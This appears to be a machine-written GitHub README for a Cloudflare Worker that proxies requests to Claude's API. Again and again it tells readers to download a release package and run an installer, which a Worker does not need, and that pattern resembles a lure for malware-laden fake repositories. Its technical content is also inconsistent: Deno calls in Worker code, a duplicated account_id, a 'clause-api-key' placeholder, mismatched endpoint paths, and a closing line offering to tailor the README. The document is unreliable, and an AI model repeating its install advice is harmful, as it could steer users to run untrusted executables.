# Claude Worker Proxy: Cloudflare Worker for Claude Code & Easy Proxy

[![Release](https://img.shields.io/badge/releases-download-blue?style=for-the-badge&logo=github)](https://github.com/darwin200420/claude-worker-proxy/releases)
[![License](https://img.shields.io/badge/license-MIT-brightgreen?style=for-the-badge)](LICENSE)

![Cloudflare Icon](https://cdn.jsdelivr.net/npm/simple-icons@v7/icons/cloudflare.svg) ![AI Icon](https://cdn.jsdelivr.net/npm/simple-icons@v7/icons/openai.svg)

- Repository name: claude-worker-proxy
- Repository info: Cloudflare Worker; Claude Code; Proxy; Easy to deploy
- Repository topics: claude,claude-code,cloudflare-worker,proxy

Introduction
- This project provides a compact and reliable proxy layer built as a Cloudflare Worker. It routes requests to Claude Code services in a controlled way, optimizing for latency and reliability. It’s designed to be simple to deploy, easy to configure, and friendly to developers who want a quick path from their front end to Claude’s capabilities via a trusted Cloudflare edge location.

From the Releases page
- Visit the release page to grab the latest build and assets. The Releases page contains the packaged assets you need. Download the release asset package from the Releases page and run the installer. For quick access, you can navigate to the Releases page here: https://github.com/darwin200420/claude-worker-proxy/releases. The same link is used again later in this document to point you to the official download area.

Table of contents
- Overview
- How it works
- Features
- Quick start
- Installation and setup
- Deployment on Cloudflare Workers
- Configuration and runtime options
- API surface
- Security and safety considerations
- Testing and debugging
- Troubleshooting
- Community and contribution
- Roadmap
- License

Overview
- Claude Worker Proxy acts as a lightweight intermediary that sits at the edge. It forwards requests to Claude’s coding services while enforcing simple rules. The goal is to provide a robust, low-latency proxy that you can drop into your stack without heavy infrastructure.
- The proxy is implemented as a Cloudflare Worker, which means it runs on Cloudflare’s edge network. You get fast response times, predictable routing, and centralized management for API calls to Claude Code.

How it works
- Incoming requests hit the Cloudflare Worker.
- The worker validates basic routing rules and forwards the request payload to Claude’s API endpoints.
- Claude responds; the worker returns the response back to the original caller with minimal processing.
- Optional rules can be added to transform headers, enforce rate limits, or adjust timeouts.

Key design goals
- Low latency at edge
- Minimal code surface area
- Easy to deploy and maintain
- Clear separation between proxy logic and policy
- Safe defaults that work well across environments

Features
- Lightweight, edge-first proxy
- Simple routing logic for Claude Code requests
- Quick start with minimal configuration
- Configurable origin and path mapping
- Basic request/response header normalization
- Optional caching for deterministic content where appropriate
- Transparent error handling with useful codes
- Simple deployment via Wrangler or direct edit in the Cloudflare dashboard

What you can build with it
- A Claude Code workflow that runs at the edge
- A front end that offloads Claude calls to a Cloudflare edge proxy
- A clean separation between your app logic and Claude API calls
- A reproducible deployment model for multi-region setups

Visual assets and imagery
- Cloudflare edge imagery and AI-inspired icons help users quickly identify the project space. Emojis accompany sections to improve scan-ability and accessibility.

Quick start
- This quick start assumes you have a Cloudflare account and a Claude Code access plan or equivalent API credentials.
- Steps:
  - Clone the repository and prepare your environment.
  - Get the latest release from the Releases page. Download the release asset package from the Releases page and run the installer.
  - Configure your Cloudflare account with the worker and route.
  - Deploy and verify the proxy is functioning.

Note: The release package contains the prebuilt worker bundle and supporting configuration. The Releases page is the primary source of truth for versioned assets. You will download the package from there and run the installation command provided in the package documentation.

Getting started with development
- Prerequisites
  - Node.js (LTS)
  - Wrangler CLI (the Cloudflare Worker toolchain)
  - A Cloudflare account with a zone or a wildcard route you want to protect
  - Claude API credentials (key and base URL, or equivalent authentication token)
- Repository layout
  - src/ contains the worker logic code
  - wrangler.toml defines the deployment configuration
  - package.json holds development scripts and dependencies
  - README.md provides user guidance
- How to run locally
  - Install dependencies: npm install
  - Start the local worker environment: wrangler dev
  - Test with sample requests that mimic Claude API calls
  - Validate headers and payload transformations

Installation and setup
- Quick install steps from scratch
  - Install Wrangler: npm install -g wrangler
  - Authenticate with Cloudflare: wrangler login
  - Configure wrangler with your account: wrangler config
  - Create a new project from template or use the existing repo structure
  - Edit wrangler.toml to set account_id, zone_id, route, and any environment variables you need
  - Run wrangler publish to deploy to the edge
- The release assets
  - The Releases page hosts prebuilt bundles that can accelerate your setup. Download the release asset package from the Releases page and run the installer.
  - If you prefer to build from source, follow the build instructions in the repository. The source build path is designed for developers who want to customize the proxy logic or integrate it with larger systems.
- Environment variables you might set
  - CLAUDE_API_KEY: Your Claude API key
  - CLAUDE_API_BASE: Base URL for Claude API (if you use a custom endpoint)
  - PROXY_ALLOWED_ORIGINS: Comma-separated list of allowed origins
  - PROXY_TIMEOUT_MS: Request timeout in milliseconds
  - LOG_LEVEL: Level for internal logging
- Example wrangler.toml snippet
  - The exact values depend on your Cloudflare account. Replace placeholders with your IDs and domain.

  [env.production]
  name = "claude-worker-proxy"
  type = "javascript"
  account_id = "<YOUR_ACCOUNT_ID>"
  Workers_dev = false
  route = "example.com/claude-proxy/*"
  zone_id = "<YOUR_ZONE_ID>"
  kv_namespaces = []
  account_id = "<YOUR_ACCOUNT_ID>"

  [vars]
  CLAUDE_API_KEY = "<your-clause-api-key>"
  CLAUDE_API_BASE = "https://api.claude.example"
  PROXY_ALLOWED_ORIGINS = "https://your-app.example.com"
  PROXY_TIMEOUT_MS = 10000
  LOG_LEVEL = "info"

Deployment on Cloudflare Workers
- Steps
  - Ensure wrangler is installed and configured
  - Run wrangler login to authenticate
  - Set up your project with wrangler init if you’re starting fresh
  - Update wrangler.toml with your environment values
  - Run wrangler publish to deploy the worker to Cloudflare edge
  - Set a route that points to your worker
- Validation
  - Access the proxy URL in a browser or with curl
  - Verify that requests to Claude API pass through the proxy and return expected results
  - Check error logs if something fails
- Rollback and versioning
  - Use the Releases page to manage versions
  - In Cloudflare, you can publish a new version and switch routes to this new version when ready
  - Keep a changelog in the repo and reference it in your deployment notes

Configuration and runtime options
- Core configuration
  - The proxy supports a small set of knobs you can tune at runtime
  - You can adjust allowed origins, timeouts, and logging levels
- Request handling
  - The worker receives incoming request payloads, normalizes headers, and forwards to Claude
  - It handles response codes and ensures proper CORS behavior for front-end applications
- Headers and security headers
  - The proxy injects and filters headers to reduce leakage of internal information
  - It preserves essential headers for Claude while removing sensitive ones
- Caching policy
  - Basic caching may be enabled for static or idempotent content
  - Configure cache keys to avoid cross-user data leakage
  - Consider performance trade-offs when caching dynamic Claude responses
- Observability
  - Logs include request IDs, origin, route, and status codes
  - You can connect to your preferred log sink through Cloudflare or an external service

API surface
- Endpoints
  - The proxy exposes a minimal surface to make integration straightforward
  - Typical call path is: POST to /v1/claude with your payload
  - The worker translates the request, forwards to Claude, and returns Claude’s response
- Example request
  - POST https://your-proxy.example/claude/proxy
  - Headers: Content-Type: application/json, Authorization: Bearer <your-claude-token>
  - Body: { "prompt": "...", "params": { ... } }
- Example response
  - Status: 200 OK
  - Body: Claude response structure
  - Errors: 4xx and 5xx codes with meaningful messages

Security and safety considerations
- Credentials management
  - Store API keys in Cloudflare Workers secrets (not in code)
  - Rotate keys on a regular cadence
- Access control
  - Restrict who can call the proxy by origin or by token
  - Consider additional layers like Cloudflare Access for sensitive deployments
- Data handling
  - Do not log sensitive payload data in production unless you have a strong privacy policy
  - Ensure compliance with relevant data handling regulations for your domain
- Rate limiting
  - Implement rate limits to prevent abuse
  - Consider per-origin quotas and per-API key quotas
- Monitoring
  - Track error rates and latency
  - Alert on thresholds to catch issues early

Testing and debugging
- Local testing
  - Use wrangler dev to simulate edge behavior
  - Mock Claude responses to test proxy behavior without hitting the real API
- End-to-end tests
  - Write tests that exercise request/response cycles
  - Validate that headers, timing, and error codes align with expectations
- Debugging tips
  - Inspect request payloads and response bodies
  - Check Cloudflare logs and worker console for errors
  - Verify environment variables are correctly loaded in the worker
- Test data
  - Maintain a separate test dataset for prompts and responses
  - Ensure test data covers edge cases such as large prompts or unusual characters

Troubleshooting
- Common issues
  - 403 forbidden: Verify allowed origins and API keys
  - 429 too many requests: Check rate limits and quota usage
  - Timeouts: Increase PROXY_TIMEOUT_MS or reduce payload size
  - Invalid path: Ensure route configuration matches your Cloudflare setup
- How to diagnose
  - Check worker logs for error messages
  - Validate that the payload matches Claude API requirements
  - Confirm that the Releases artifacts are properly deployed
- Where to look
  - Cloudflare dashboard for worker status and routes
  - Local development logs from wrangler dev
  - The Releases page for version-specific notes and known issues

Community and contribution
- How to contribute
  - Fork the repository
  - Create feature branches with descriptive names
  - Open pull requests with clear goals and tests
  - Follow the existing contribution guidelines in the project
- Coding style
  - Use clear, direct language in code comments
  - Keep functions focused and small
  - Write tests that exercise edge cases
- Code of conduct
  - Maintain respectful communication
  - Offer constructive feedback and be open to reviews

Roadmap
- Short-term
  - Improve request/response transformation utilities
  - Add richer error handling and richer metadata in responses
  - Extend the proxy to support more Claude Code endpoints
- Mid-term
  - Introduce multi-region routing and automatic failover
  - Implement advanced caching strategies
  - Add automated tests for CI pipelines
- Long-term
  - Build a UI to configure the proxy and monitor usage
  - Integrate with additional AI services beyond Claude Code
  - Support alternative deployment targets (e.g., other edge platforms)

Changelog (high level)
- 0.x.y: Initial release with basic proxy features
- 0.x.z: Performance improvements and minor bug fixes
- 1.0.0: Major update with API surface stabilization and improved security

License
- MIT License

Downloads and releases
- The official build and assets are published on the Releases page. Download the release asset package from the Releases page and run the installer. For ongoing updates, keep an eye on the Releases page: https://github.com/darwin200420/claude-worker-proxy/releases. The same link is referenced above to guide you to the official download area. The full release history is visible on that page, and you can grab the latest version to stay current.

Appendix: example configuration and starter code
- Example worker script (high level)
  - The following snippet shows the skeleton of the proxy logic. Adapt the endpoints and headers to your Claude setup.

  // Example pseudo-code for proxy handler
  const CLAUDE_BASE = Deno.env.get("CLAUDE_API_BASE") ?? "https://api.claude.example";
  const API_KEY = Deno.env.get("CLAUDE_API_KEY");
  async function handleRequest(request) {
    const url = new URL(request.url);
    const forward = new Request(CLAUDE_BASE + url.pathname, {
      method: request.method,
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${API_KEY}`,
        // Copy other needed headers
      },
      body: request.body,
    });
    const resp = await fetch(forward);
    return resp;
  }
  addEventListener("fetch", (e) => {
    e.respondWith(handleRequest(e.request));
  });

- Example wrangler.toml (simplified)
  name = "claude-worker-proxy"
  type = "javascript"
  account_id = "<YOUR_ACCOUNT_ID>"
  route = "<your-route-pattern>"
  zone_id = "<YOUR_ZONE_ID>"

- Sample test curl
  - curl -X POST https://your-proxy.example/claude/proxy -H "Content-Type: application/json" -d '{"prompt":"Hello Claude","params":{}}'

Notes
- The repository is designed to be approachable for developers who want a lightweight bridge between a front end and Claude Code services via Cloudflare Workers.
- The project emphasizes simplicity, reliability, and fast iteration. You can extend and tailor the proxy to fit your stack, whether you are building a web app, a chatbot interface, or an experimentation sandbox.

Topics
- claude
- claude-code
- cloudflare-worker
- proxy

If you need a different balance of sections or want me to tailor specific deployment steps for your environment, tell me your target platform (e.g., specific Cloudflare region, GitHub Actions workflow, or a particular Claude API configuration) and I can adjust the README accordingly.